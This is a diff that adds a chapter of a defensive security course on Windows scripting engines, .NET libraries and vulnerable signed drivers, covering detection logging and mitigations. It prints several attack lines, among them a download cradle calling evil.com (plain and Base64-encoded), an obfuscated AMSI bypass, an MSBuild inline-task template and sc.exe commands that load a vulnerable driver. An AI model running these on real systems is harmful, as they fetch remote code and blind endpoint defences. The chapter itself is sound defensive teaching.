@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="chapter-id" content="03">
+  <meta name="module-id" content="lolbas">
+  <title>LOLScripts, LOLLibs, and LOLDrivers · LOLBAS · H3AD-LEARN</title>
+  <link rel="icon" href="https://h3ad-sec.github.io/fevicon.png?v=2026">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Exo+2:wght@300;400;500;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+  <div class="reading-progress" id="readingProgress"></div>
+  <header class="site-header">
+    <div class="header-inner">
+      <div class="header-left">
+        <a href="../index.html" class="logo-link">
+          <img src="https://raw.githubusercontent.com/h3ad-sec/h3ad-sec.github.io/main/logo-dark.png" id="site-logo" class="site-logo" alt="H3AD-SEC" height="32">
+        </a>
+        <div class="nav-pill">
+          <span class="nav-pill-name">H3AD-LEARN</span>
+          <span class="nav-pill-sep">·</span>
+          <span class="nav-pill-tagline">LOLSCRIPTS AND DRIVERS</span>
+        </div>
+      </div>
+      <nav class="header-nav">
+        <a href="../index.html" class="nav-link">Hub</a>
+        <a href="index.html" class="nav-link">LOLBAS</a>
+        <a href="../threat-hunting/index.html" class="nav-link">Threat Hunting</a>
+      </nav>
+      <div class="header-actions">
+        <button class="theme-toggle" id="themeToggle" aria-label="Toggle theme">
+          <svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+          <svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:none"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+        </button>
+      </div>
+    </div>
+  </header>
+  <div class="chapter-layout">
+    <aside class="toc-sidebar" id="tocSidebar">
+      <a href="index.html" class="toc-back-link">← LOLBAS</a>
+      <div class="toc-chapter-info">
+        <span class="mono accent" style="font-size:0.75rem;letter-spacing:0.1em;">CHAPTER 03 of 8</span>
+        <span class="muted" style="font-size:0.75rem;font-family:var(--font-mono)">30 MIN READ</span>
+      </div>
+      <nav class="toc-nav" id="tocNav"><!-- JS-populated --></nav>
+      <div class="toc-progress">
+        <span class="section-label" style="font-size:0.55rem;letter-spacing:0.2em;color:var(--muted);font-family:var(--font-mono)">PROGRESS</span>
+        <div class="toc-progress-bar"><div class="toc-progress-fill" id="chapterProgressFill"></div></div>
+        <span class="muted" style="font-size:0.72rem;font-family:var(--font-mono)" id="chapterProgressLabel">0 of 6 sections</span>
+      </div>
+    </aside>
+    <main class="chapter-body" id="chapterBody">
+      <article>
+        <header class="chapter-header">
+          <div class="chapter-meta">
+            <span class="badge-module mono">CHAPTER 03</span>
+            <span class="badge-time muted mono">30 MIN READ</span>
+            <span class="badge-diff badge-intermediate">INTERMEDIATE</span>
+          </div>
+          <h1 class="chapter-title">LOLScripts, LOLLibs, and LOLDrivers</h1>
+          <p class="chapter-intro">Scripting engines, .NET assemblies, and kernel drivers all ship with Windows. Attackers repurpose all three. This chapter covers how each category works, what makes it dangerous, and what logging controls exist to catch abuse.</p>
+          <div class="chapter-tags">
+            <span class="tag">PowerShell</span>
+            <span class="tag">AMSI</span>
+            <span class="tag">BYOVD</span>
+            <span class="tag">LOLDrivers</span>
+          </div>
+        </header>
+
+        <!-- SECTION 1 -->
+        <section id="lolscripts-overview">
+          <h2>LOLScripts: Scripting Engines as Attack Tools</h2>
+          <p>LOLScripts are scripting engines shipped with Windows that attackers repurpose to run attacker-controlled code. The script file itself can be entirely malicious, but the engine executing it is a trusted, signed Windows component. That distinction matters: process-based allowlisting blocks unknown binaries, but it cannot block a trusted scripting engine running a hostile script.</p>
+          <p>The four core LOLScript engines are:</p>
+          <ul>
+            <li><strong>PowerShell</strong> (.ps1 files via powershell.exe) — the most powerful, with full .NET API access and a built-in module ecosystem.</li>
+            <li><strong>VBScript</strong> (.vbs files via wscript.exe or cscript.exe) — widely deployed in corporate environments, historically the dominant phishing dropper format.</li>
+            <li><strong>JScript</strong> (.js files via wscript.exe or cscript.exe) — JavaScript for Windows Script Host, also executable through Internet Explorer and Edge Legacy via ActiveX.</li>
+            <li><strong>HTA</strong> (.hta files via mshta.exe) — HTML Application, a hybrid format combining HTML markup with VBScript or JScript, executed outside browser security zones.</li>
+          </ul>
+          <p>What makes scripting engines particularly powerful for attackers is the runtime environment they provide. Unlike a simple LOLBin that invokes one fixed function, a scripting engine accepts multi-line programs. PowerShell scripts can make HTTP requests, write registry keys, load .NET assemblies, and spawn child processes, all from inside a trusted Windows runtime. The attacker brings the code; Windows brings the execution environment.</p>
+          <p>The key distinction from traditional LOLBins: with a LOLBin, the binary does the malicious work. With a LOLScript, the binary is just a runtime. The payload is the script file or inline command passed to it. That payload can be entirely in memory, fetched from a remote URL, or embedded as an encoded string in a command-line argument.</p>
+
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th>Script Language</th>
+                  <th>Engine Binary</th>
+                  <th>Extension</th>
+                  <th>Primary Abuse</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>PowerShell</td>
+                  <td>powershell.exe / pwsh.exe</td>
+                  <td>.ps1</td>
+                  <td>Download cradles, AMSI bypass, in-memory execution, C2 staging</td>
+                </tr>
+                <tr>
+                  <td>VBScript</td>
+                  <td>wscript.exe, cscript.exe</td>
+                  <td>.vbs</td>
+                  <td>Phishing droppers, registry persistence, WMI recon</td>
+                </tr>
+                <tr>
+                  <td>JScript</td>
+                  <td>wscript.exe, cscript.exe</td>
+                  <td>.js</td>
+                  <td>HTML smuggling payloads, commodity malware droppers</td>
+                </tr>
+                <tr>
+                  <td>HTA</td>
+                  <td>mshta.exe</td>
+                  <td>.hta</td>
+                  <td>Trusted application execution, no UAC prompt, no Protected Mode restriction</td>
+                </tr>
+                <tr>
+                  <td>WSF (Windows Script File)</td>
+                  <td>wscript.exe, cscript.exe</td>
+                  <td>.wsf</td>
+                  <td>Multi-language dropper combining VBScript and JScript in one file</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </section>
+
+        <!-- SECTION 2 -->
+        <section id="powershell-abuse">
+          <h2>PowerShell as a LOLScript</h2>
+          <p>PowerShell is the most abused LOLScript. It ships on every modern Windows installation, has full access to the .NET framework and Windows API, supports network operations natively, and provides built-in obfuscation mechanisms that are legitimate features of the language. Defenders cannot simply block it.</p>
+
+          <h3>Encoded command execution</h3>
+          <p>The <code>-EncodedCommand</code> flag (or <code>-enc</code>) accepts a Base64-encoded Unicode string as the command to execute. The original text is never visible in the process command line. It exists primarily to handle special characters in automated pipelines, but attackers use it to hide payload content from keyword-based detection.</p>
+
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">CMD</span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
+            <pre><code>powershell.exe -NoProfile -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcAAuAHAAcwAxACcAKQA=</code></pre>
+          </div>
+
+          <div class="callout-warning"><strong>Warning:</strong> Encoded commands alone are not reliable indicators of malicious activity. Many legitimate tools encode long strings to avoid shell escaping and character encoding issues. The encoded content matters, not the encoding itself. Script Block Logging (Event ID 4104) captures the decoded payload at execution time.</div>
+
+          <h3>In-memory download cradle</h3>
+          <p>The most consequential PowerShell technique is the download cradle: fetching a remote script and executing it directly in memory via <code>Invoke-Expression</code>. No file is written to disk. File-based AV scanning cannot see the payload. The script exists only in process memory for the duration of execution.</p>
+
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">PowerShell</span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
+            <pre><code>IEX (New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1')</code></pre>
+          </div>
+
+          <h3>Execution policy bypass</h3>
+          <p>PowerShell's execution policy is a user-facing safety control, not a security boundary. It can be bypassed with a single flag:</p>
+
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">CMD</span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
+            <pre><code>powershell.exe -ExecutionPolicy Bypass -File C:\payload.ps1
+powershell.exe -ep bypass -File C:\payload.ps1</code></pre>
+          </div>
+
+          <h3>AMSI bypass via reflection</h3>
+          <p>AMSI (Antimalware Scan Interface) is the Windows mechanism that passes script content to installed AV engines before execution. Attackers bypass it by patching the AMSI initialization state in memory using .NET reflection, before loading any malicious code. Once <code>amsiInitFailed</code> is set to true, AMSI stops scanning that PowerShell session.</p>
+
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">PowerShell</span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
+            <pre><code>[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils').GetField('amsiIn'+'itFailed','NonPublic,Static').SetValue($null,$true)</code></pre>
+          </div>
+
+          <p>Note the string concatenation: <code>'Am'+'siUtils'</code> and <code>'amsiIn'+'itFailed'</code>. This is deliberate obfuscation targeting signature-based detection rules that match the full string literal. The .NET reflection call itself is split across the string boundary at runtime, but AMSI sees the obfuscated source before execution.</p>
+
+          <h3>Additional flags commonly chained together</h3>
+          <p><code>-WindowStyle Hidden</code> (or <code>-w hidden</code>) suppresses the console window entirely. <code>-NoProfile</code> (or <code>-nop</code>) skips loading the user's profile, which could contain defensive functions or logging. Both are frequently combined with encoded commands and download cradles in single-line payloads.</p>
+
+          <h3>Detection</h3>
+          <p>PowerShell Event ID 4104 (Script Block Logging) captures the full deobfuscated code at the point Windows is about to execute it. Event ID 4103 (Module Logging) records pipeline execution details. Both require explicit Group Policy enablement under Computer Configuration > Administrative Templates > Windows Components > Windows PowerShell. Without them, command-line logging via Sysmon EID 1 is the only fallback, and it shows only the encoded string, not the decoded content.</p>
+        </section>
+
+        <!-- SECTION 3 -->
+        <section id="vbscript-jscript">
+          <h2>VBScript, JScript, and Windows Script Host</h2>
+          <p>Windows Script Host (WSH) is the runtime layer that executes VBScript and JScript files. It ships with every Windows version and cannot be uninstalled without breaking system components. Two WSH binaries exist: <code>wscript.exe</code> runs scripts with a GUI context (dialog boxes are visible), and <code>cscript.exe</code> runs scripts in a console context. Attackers typically prefer wscript for running payloads silently.</p>
+
+          <h3>VBScript</h3>
+          <p>VBScript (.vbs) has been a standard phishing delivery format for two decades. A malicious .vbs file arriving as an email attachment, once opened, runs immediately in the user's context with their full privileges. Common attack patterns include downloading a stage-2 binary from a remote URL using <code>WScript.Shell</code> and <code>XMLHTTP</code> objects, writing the binary to <code>%TEMP%</code>, and executing it via <code>Shell.Run</code>. All of this is done through the VBScript standard library with no additional tooling required.</p>
+          <p>Persistence is equally straightforward. A VBScript can write its own path to <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code> and survive reboots. WMI queries for running processes, user accounts, and domain information are available through the <code>GetObject("winmgmts:")</code> call.</p>
+
+          <h3>JScript</h3>
+          <p>JScript (.js) is the WSH implementation of JavaScript. It runs through the same wscript/cscript runtime as VBScript and shares the same COM object model, so the same persistence and download capabilities apply. JScript gained particular relevance with HTML smuggling: attackers embed base64-encoded payloads inside HTML files and use browser-side JavaScript to decode and save them locally, often as .hta files that then auto-execute via file association.</p>
+
+          <h3>HTA (HTML Application)</h3>
+          <p>HTA files execute through mshta.exe rather than a browser. The critical difference is trust context: HTAs run outside the browser security zone, receive no Protected Mode restriction, and can call arbitrary COM objects and shell commands. Double-clicking an .hta file (or following a link to one) launches it with full user privileges. No UAC prompt appears because mshta.exe is a trusted Windows binary and the HTA runs in the user's context, not an elevated one.</p>
+          <p>A minimal malicious HTA is a few lines of VBScript wrapped in HTML. It can download and execute a binary, create scheduled tasks, or write registry persistence before closing the window. The entire execution happens inside mshta.exe, which is a signed Windows binary.</p>
+
+          <h3>WSF (Windows Script File)</h3>
+          <p>WSF files combine multiple scripting languages in a single XML-structured file. They are less common in commodity malware but appear in more targeted operations where an attacker wants to mix VBScript and JScript capabilities or evade engine-specific detection signatures.</p>
+
+          <h3>Detection gap and available signals</h3>
+          <p>VBScript and JScript have no equivalent to PowerShell's Script Block Logging. There is no built-in mechanism to capture the script content at execution time. Process creation (Sysmon Event ID 1) is the primary signal, specifically looking for:</p>
+          <ul>
+            <li>wscript.exe or cscript.exe spawned by Office applications, browser processes, or email clients</li>
+            <li>Scripts executing from <code>%TEMP%</code>, <code>%APPDATA%</code>, or email attachment staging directories</li>
+            <li>wscript.exe making outbound network connections (Sysmon EID 3), which is anomalous for a script engine</li>
+            <li>mshta.exe spawned with a URL as an argument rather than a local file path</li>
+          </ul>
+        </section>
+
+        <!-- SECTION 4 -->
+        <section id="lollibs-dotnet">
+          <h2>LOLLibs: .NET and COM Abuse</h2>
+          <p>LOLLibs are .NET assemblies and COM components that ship with Windows and can be loaded by legitimate processes to execute attacker-supplied code. The distinction from LOLBins and LOLScripts is that LOLLibs are libraries, not standalone executables. The execution happens inside a host process, making attribution to a specific binary less straightforward.</p>
+
+          <h3>In-memory .NET assembly loading</h3>
+          <p>PowerShell provides direct access to the .NET reflection API. An attacker who has a malicious .NET DLL can base64-encode it, embed it as a string in a PowerShell script, decode it back to bytes, and load it into the current process entirely in memory:</p>
+
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">PowerShell</span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
+            <pre><code>$bytes = [System.Convert]::FromBase64String($b64EncodedDll)
+$assembly = [System.Reflection.Assembly]::Load([byte[]]$bytes)
+$type = $assembly.GetType('Namespace.ClassName')
+$method = $type.GetMethod('Execute')
+$method.Invoke($null, $null)</code></pre>
+          </div>
+
+          <p>No DLL file is written to disk. The assembly exists only in the PowerShell process memory. AV file scanning cannot detect it. Script Block Logging captures the PowerShell code, but not the decoded assembly content directly.</p>
+
+          <h3>MSBuild inline task (T1127.001)</h3>
+          <p>MSBuild.exe is the Microsoft Build Engine, a trusted .NET tool included with Visual Studio and .NET SDK installations. It accepts XML project files and can execute inline C# code through a feature called inline tasks. Attackers craft a .csproj or .targets file containing malicious C# code and pass it to msbuild.exe.</p>
+
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">XML</span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
+            <pre><code>&lt;Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003"&gt;
+  &lt;Target Name="Run"&gt;
+    &lt;ClassExample /&gt;
+  &lt;/Target&gt;
+  &lt;UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory"
+    AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll"&gt;
+    &lt;Task&gt;
+      &lt;Code Type="Class" Language="cs"&gt;
+        &lt;![CDATA[
+          // Malicious C# code here — compiled and executed at runtime
+          using Microsoft.Build.Framework;
+          using Microsoft.Build.Utilities;
+          public class ClassExample : Task {
+            public override bool Execute() {
+              System.Diagnostics.Process.Start("cmd.exe");
+              return true;
+            }
+          }
+        ]]&gt;
+      &lt;/Code&gt;
+    &lt;/Task&gt;
+  &lt;/UsingTask&gt;
+&lt;/Project&gt;</code></pre>
+          </div>
+
+          <div class="callout-tip"><strong>Tip:</strong> MSBuild inline task execution does not require a pre-compiled DLL. The C# code is embedded directly in the project file and compiled at runtime inside msbuild.exe, which is often on AppLocker allowlists. The compiled code never exists as a separate file.</div>
+
+          <h3>COM hijacking context (T1546.015)</h3>
+          <p>COM (Component Object Model) components are registered across the system and loaded by legitimate processes. While COM hijacking is primarily a persistence technique (overwriting registry keys to substitute a malicious COM object for a legitimate one), the mechanism also enables proxy execution: the malicious COM object runs inside a trusted host process, inheriting its trust context and process characteristics.</p>
+
+          <h3>P/Invoke abuse</h3>
+          <p>P/Invoke (Platform Invocation Services) is the .NET mechanism for calling native Windows API functions from managed code. It is a legitimate feature used throughout the .NET ecosystem. Attackers use it to call low-level Windows APIs (VirtualAlloc, CreateThread, WriteProcessMemory) directly from PowerShell or C# without going through managed wrappers, bypassing some .NET security guardrails in the process.</p>
+        </section>
+
+        <!-- SECTION 5 -->
+        <section id="loldrivers-byovd">
+          <h2>LOLDrivers and BYOVD</h2>
+          <p>LOLDrivers are legitimate, digitally signed Windows kernel drivers that contain exploitable vulnerabilities. BYOVD (Bring Your Own Vulnerable Driver) is the technique of loading one of these drivers to gain kernel-level code execution, then using that access to disable endpoint security tools.</p>
+
+          <h3>Why kernel level matters</h3>
+          <p>Modern EDR products run as user-mode processes. They inject hooks into other processes and rely on kernel callbacks to receive notifications about process creation, file writes, and registry modifications. An attacker who achieves ring-0 (kernel) access can operate at a higher privilege level than those security tools. From the kernel, the attacker can terminate EDR processes directly, remove the kernel callbacks that notify those tools of activity, and hide processes and files from user-mode visibility. The security tool continues running but receives no telemetry and cannot protect anything.</p>
+
+          <h3>How BYOVD works</h3>
+          <p>The attack follows a consistent sequence:</p>
+          <ol>
+            <li>Identify a legitimate signed driver with a known exploitable vulnerability. The loldrivers.io community catalog documents hundreds of these. Common examples include RTCore64.sys (from EVGA GPU software) and mhyprot2.sys (from Genshin Impact's anti-cheat system).</li>
+            <li>Drop the vulnerable driver to disk and load it using the Windows service control manager: <code>sc.exe create vuln_driver binPath= C:\path\to\driver.sys type= kernel</code> followed by <code>sc.exe start vuln_driver</code>. Windows allows the load because the driver is signed by a legitimate vendor.</li>
+            <li>Exploit the vulnerability in the loaded driver to achieve arbitrary kernel code execution. The vulnerability might be a privilege escalation bug, an IOCTL that exposes raw memory read/write, or an out-of-bounds write.</li>
+            <li>Use kernel access to terminate EDR processes, unregister their kernel callbacks, disable their minifilter drivers, or manipulate process protection levels.</li>
+          </ol>
+
+          <h3>Real-world examples</h3>
+          <p>BlackMatter ransomware used mhyprot2.sys to terminate AV and EDR products before starting encryption. Scattered Spider (UNC3944) used vulnerable network adapter drivers in their operations. Cuba ransomware used a similar technique. The Lazarus Group has used multiple BYOVD variations across their tooling. All of these cases share the same pattern: a signed, legitimate driver used as an attack vehicle.</p>
+
+          <h3>The loldrivers.io project</h3>
+          <p>The loldrivers.io community maintains a catalog of known vulnerable, malicious, and potentially dangerous Windows drivers. Each entry includes the driver name, hash values, known vulnerability details, and affected versions. Detection teams use this catalog to build blocklists and hunting queries against Sysmon driver load events.</p>
+
+          <div class="callout-warning"><strong>Warning:</strong> BYOVD attacks are among the most severe LOL techniques available to attackers. Kernel access effectively defeats most user-mode security tooling. Detecting these attacks requires kernel-level telemetry that many organizations do not have configured. HVCI is the most effective mitigation and is available on all modern Windows systems.</div>
+
+          <h3>Defense</h3>
+          <p>Microsoft maintains the Vulnerable Driver Blocklist, a list of drivers known to be exploitable. HVCI (Hypervisor-Protected Code Integrity) enforces this blocklist at the hypervisor level, preventing vulnerable drivers from loading regardless of their code signature. HVCI is available on Windows 10 and later and is the primary defense against BYOVD. Sysmon Event ID 6 (DriverLoad) provides detection telemetry for monitoring driver loads against known-bad hashes from the loldrivers.io catalog.</p>
+        </section>
+
+        <!-- SECTION 6 -->
+        <section id="detection-logging">
+          <h2>Detection and Logging for LOLScripts and Drivers</h2>
+          <p>Detection coverage for LOLScripts varies significantly by technology. PowerShell has rich optional logging. VBScript and JScript have almost none. LOLDrivers require kernel telemetry that is not enabled by default.</p>
+
+          <h3>PowerShell logging tiers</h3>
+          <p>All four PowerShell logging mechanisms require explicit Group Policy enablement. None are on by default in standard Windows installations.</p>
+
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th>Log Type</th>
+                  <th>Event ID</th>
+                  <th>What It Captures</th>
+                  <th>Value</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>Script Block Logging</td>
+                  <td>4104</td>
+                  <td>Full deobfuscated code at execution time</td>
+                  <td>Highest — catches encoded and obfuscated payloads</td>
+                </tr>
+                <tr>
+                  <td>Module Logging</td>
+                  <td>4103</td>
+                  <td>Pipeline execution details, module output</td>
+                  <td>High — supplements script block logs</td>
+                </tr>
+                <tr>
+                  <td>Transcription</td>
+                  <td>(file output)</td>
+                  <td>All input and output written to log file</td>
+                  <td>Forensic — useful post-incident</td>
+                </tr>
+                <tr>
+                  <td>Protected Event Logging</td>
+                  <td>4104 (encrypted)</td>
+                  <td>Script block logs encrypted so attacker cannot read own captured payloads</td>
+                  <td>High in adversarial environments</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+
+          <p>Enable Script Block Logging via Group Policy: Computer Configuration > Administrative Templates > Windows Components > Windows PowerShell > Turn on PowerShell Script Block Logging.</p>
+
+          <div class="callout-tip"><strong>Tip:</strong> Script Block Logging catches deobfuscated PowerShell because Windows records the actual code it is about to execute, after decoding. An attacker who uses <code>-enc</code> to hide a payload in Base64 still gets caught by EID 4104 because the decoded code is captured at execution time, not the encoded command-line string.</div>
+
+          <h3>VBScript and JScript gap</h3>
+          <p>No script-content logging equivalent exists for VBScript or JScript. The only built-in signals are:</p>
+          <ul>
+            <li>Process creation (Sysmon EID 1): captures the wscript/cscript command line, including the script file path. Does not capture script content.</li>
+            <li>Network connections (Sysmon EID 3): wscript.exe or cscript.exe making outbound connections is anomalous and should alert.</li>
+            <li>File creation (Sysmon EID 11): a script writing executables to %TEMP% is a high-signal indicator.</li>
+          </ul>
+          <p>The absence of content logging means defenders rely entirely on behavioral signals: which process spawned wscript, where the script file came from, and what the script engine does after it starts.</p>
+
+          <h3>LOLDriver detection</h3>
+          <p>Sysmon Event ID 6 (DriverLoad) records driver loads with the driver file path and hash. The detection workflow:</p>
+          <ol>
+            <li>Collect Sysmon EID 6 events across the environment.</li>
+            <li>Hash-match loaded drivers against the loldrivers.io catalog. Any match warrants immediate investigation.</li>
+            <li>Monitor for <code>sc.exe create</code> with a <code>type= kernel</code> argument and a driver path outside <code>%SystemRoot%\System32\drivers\</code>.</li>
+            <li>Alert on driver loads from user-writable directories (Desktop, %TEMP%, %APPDATA%).</li>
+          </ol>
+          <p>HVCI prevents the load in the first place. Sysmon EID 6 detects attempts on systems without HVCI. Both controls together provide defense-in-depth against BYOVD.</p>
+        </section>
+
+        <div class="chapter-summary">
+          <h3>Key Takeaways</h3>
+          <ul>
+            <li>LOLScripts are scripting engines (PowerShell, VBScript, JScript, WSH) that run attacker-controlled code inside trusted Windows runtimes, with no additional binary required.</li>
+            <li>PowerShell provides download-in-memory execution, full .NET API access, and AMSI bypass capabilities, making it the most capable and commonly abused LOLScript.</li>
+            <li>Script Block Logging (Event ID 4104) captures deobfuscated PowerShell at execution time. It requires explicit GPO enablement and is the most important PowerShell detection control available.</li>
+            <li>VBScript and JScript have no script-content logging equivalent. Process creation (Sysmon EID 1) is the primary detection source, especially for wscript/cscript spawned by Office applications or email clients.</li>
+            <li>LOLDrivers exploit vulnerable signed kernel drivers via BYOVD to gain ring-0 code execution and terminate EDR processes from the kernel level, operating at a higher privilege than user-mode security tools.</li>
+            <li>HVCI (Hypervisor-Protected Code Integrity) and the Microsoft Vulnerable Driver Blocklist are the most effective mitigations against LOLDriver attacks, preventing known-vulnerable drivers from loading regardless of their digital signature.</li>
+          </ul>
+        </div>
+
+        <div class="knowledge-check">
+          <h3 class="kc-title">Knowledge Check</h3>
+          <p class="kc-intro muted">Click an answer to reveal the explanation.</p>
+
+          <div class="kc-question">
+            <p class="kc-prompt">What PowerShell event ID captures the deobfuscated content of encoded scripts at execution time?</p>
+            <div class="kc-options">
+              <button class="kc-option" data-correct="false">A. Event ID 4688 (Process Creation)</button>
+              <button class="kc-option" data-correct="true">B. Event ID 4104 (Script Block Logging)</button>
+              <button class="kc-option" data-correct="false">C. Event ID 4103 (Module Logging)</button>
+              <button class="kc-option" data-correct="false">D. Event ID 800 (PowerShell Host Application)</button>
+            </div>
+            <div class="kc-answer">Event ID 4104 is Script Block Logging. It records the full PowerShell code Windows is about to execute, after all deobfuscation has occurred. An attacker who uses <code>-enc</code> to hide their payload in a Base64-encoded string cannot hide from 4104: the decoded code is captured at execution time. This control must be enabled via Group Policy and is one of the most valuable Windows security logs available to defenders.</div>
+          </div>
+
+          <div class="kc-question">
+            <p class="kc-prompt">What makes BYOVD attacks difficult to defend against with user-mode security tools?</p>
+            <div class="kc-options">
+              <button class="kc-option" data-correct="false">A. BYOVD exploits zero-day vulnerabilities with no public patches</button>
+              <button class="kc-option" data-correct="true">B. The attacker loads a legitimate signed driver, exploits it for kernel access, and uses ring-0 privileges to terminate user-mode EDR processes</button>
+              <button class="kc-option" data-correct="false">C. BYOVD attacks generate no Windows event log entries whatsoever</button>
+              <button class="kc-option" data-correct="false">D. BYOVD requires the attacker to compromise the kernel during OS installation</button>
+            </div>
+            <div class="kc-answer">BYOVD loads a legitimately signed driver that Windows allows. The vulnerability in that driver is then exploited to gain ring-0 execution. From the kernel, the attacker can terminate user-mode EDR processes, remove kernel callbacks that feed telemetry to those tools, and effectively blind endpoint security. HVCI (Hypervisor-Protected Code Integrity) mitigates this by enforcing a driver allowlist at the hypervisor level, preventing known-vulnerable drivers from loading regardless of their signature.</div>
+          </div>
+
+          <div class="kc-question">
+            <p class="kc-prompt">Which PowerShell technique executes a remote script in memory without writing a file to disk?</p>
+            <div class="kc-options">
+              <button class="kc-option" data-correct="false">A. powershell.exe -File C:\script.ps1</button>
+              <button class="kc-option" data-correct="true">B. IEX (New-Object Net.WebClient).DownloadString('http://url') — in-memory download cradle</button>
+              <button class="kc-option" data-correct="false">C. powershell.exe -enc BASE64_COMMAND</button>
+              <button class="kc-option" data-correct="false">D. Import-Module C:\module.psm1</button>
+            </div>
+            <div class="kc-answer">The IEX download cradle uses Invoke-Expression to immediately execute the string returned by DownloadString. The script never exists as a file on disk: it is fetched, held in memory as a string, and executed. File-based AV scanning cannot detect it. Script Block Logging (Event ID 4104) does capture it, because Windows records the code at execution time regardless of how it arrived in the process.</div>
+          </div>
+        </div>
+
+        <nav class="chapter-nav">
+          <a href="02-lolbin-catalog.html" class="chapter-nav-prev">← LOLBin Catalog</a>
+          <a href="04-attacker-tradecraft.html" class="chapter-nav-next">Attacker Tradecraft →</a>
+        </nav>
+      </article>
+    </main>
+  </div>
+  <script src="../js/learn.js"></script>
+  <script>document.addEventListener('DOMContentLoaded', () => initChapter('03', 6));</script>
+</body>
+</html>
